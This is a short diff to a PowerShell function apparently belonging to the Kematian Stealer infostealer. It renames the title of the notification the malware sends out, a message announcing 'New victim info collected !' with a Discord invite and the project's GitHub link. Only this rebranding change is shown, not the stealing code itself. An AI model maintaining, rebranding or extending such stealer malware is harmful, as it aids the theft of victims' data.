@@ -1230,7 +1230,7 @@ function Backup-Data {
         "url"        = "https://discord.com/invite/WJCNUpxnrE"
         "embeds"     = @(
             @{
-                "title"       = "Kematian Stealer"
+                "title"       = "KING SAHM"
                 "url"         = "https://github.com/Somali-Devs/Kematian-Stealer"
                 "description" = "New victim info collected !"
                 "color"       = "15105570"
